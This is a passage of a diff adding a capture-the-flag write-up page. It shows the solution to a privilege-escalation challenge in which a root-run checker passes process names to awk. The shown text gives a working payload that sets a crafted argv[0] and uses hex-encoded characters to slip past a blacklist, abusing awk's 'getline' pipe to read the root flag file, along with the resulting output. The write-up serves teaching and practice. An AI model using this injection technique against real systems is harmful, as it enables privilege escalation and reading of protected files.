+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">execve</span>(<span style="color:#e6db74">&#34;/home/user/vmchecker/pwnme.sh&#34;</span>, argv_, envp);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This time, the challenge fixes the vulnerability by using <code>execve()</code> with a clean environment, which prevents <code>AWKPATH</code> injection and completely breaks the initial exploit.</p>
+<p>Now, it is us against <code>awk</code> and we know that in our process name :</p>
+<ul>
+<li>We cannot use spaces, so no <code>BEGIN</code> .. <code>END</code>.</li>
+<li>We cannot use parentheses, so no <code>system()</code>.</li>
+<li>We cannot use curly braces <code>{}</code> either.</li>
+</ul>
+<p>After digging into this <a href="https://www.gnu.org/software/gawk/manual/gawk.html#Using-getline-from-a-Pipe">GNU awk documentation</a>, I learned that it is possible to execute commands with <code>awk &quot;&lt;command&gt; | getline&quot; &lt;file&gt;</code></p>
+<p>In our case, this allows us to run a command using <code>awk &quot;\&quot;cmd\&quot;|getline&quot; &lt;file&gt;</code> and hence, run commands as root. All we need now is to <code>cat</code> the flag file. However, there is still one issue, we cannot use either <code>s</code> or <code>h</code>, nor <code>/</code> . To bypass that, we can use hex encoding for the blacklisted characters.</p>
+<p>Finally, I used the following commands to craft the final payload.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cd /tmp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># create file with our payload</span>
+</span></span><span style="display:flex;"><span>cat &gt; payload <span style="color:#e6db74">&lt;&lt; &#39;EOF&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">cat /root/smell_like_a_flag/flag*
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># create pauser</span>
+</span></span><span style="display:flex;"><span>cat &gt; pauser.c <span style="color:#e6db74">&lt;&lt; &#39;EOF&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">#include &lt;unistd.h&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">int main() { pause(); return 0; }
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>gcc -o pauser pauser.c
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># set awk payload</span>
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;\&#34;cat&lt;&#39;\x2ftmp\x2fpayload&#39;|&#39;\x73\x68&#39;\&#34;|getline&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># run pauser with payload as argv[0]</span>
+</span></span><span style="display:flex;"><span>exec -a <span style="color:#e6db74">&#34;</span>$payload<span style="color:#e6db74">&#34;</span> ./pauser &amp;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cd /home/user/vmchecker
+</span></span><span style="display:flex;"><span>./pwnme 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> <span style="color:#ae81ff">30</span>
+</span></span><span style="display:flex;"><span>Enter the input: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Error: unsafe process name detected. <span style="color:#66d9ef">for</span> process /proc/1
+</span></span><span style="display:flex;"><span>Error: unsafe process name detected. <span style="color:#66d9ef">for</span> process /proc/13
+</span></span><span style="display:flex;"><span>Error: unsafe process name detected. <span style="color:#66d9ef">for</span> process /proc/19
+</span></span><span style="display:flex;"><span>Error: unsafe process name detected. <span style="color:#66d9ef">for</span> process /proc/20
+</span></span><span style="display:flex;"><span>RM<span style="color:#f92672">{</span>0ops_th3_c0de_w4s_3v3n_w0rse_th4n_3xp3cted_n0w_y0u_r3ally_n33d_t0_f1nd_a_n3w_j0b<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>Error: unsafe process name detected. <span style="color:#66d9ef">for</span> process /proc/31
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> <span style="color:#ae81ff">5</span> unsafe process name or suspicious mapping detected. Check before push in production
+</span></span></code></pre></div><p>And voila, flagged ^^</p>
+
+    </div>
+    
+
+  </div>
+
+
+  </main>
+  <footer>
+    
+<p>© 2025 Sto ʚɞ. All rights reserved.</p>
+  </footer>
+</body>
+</html>
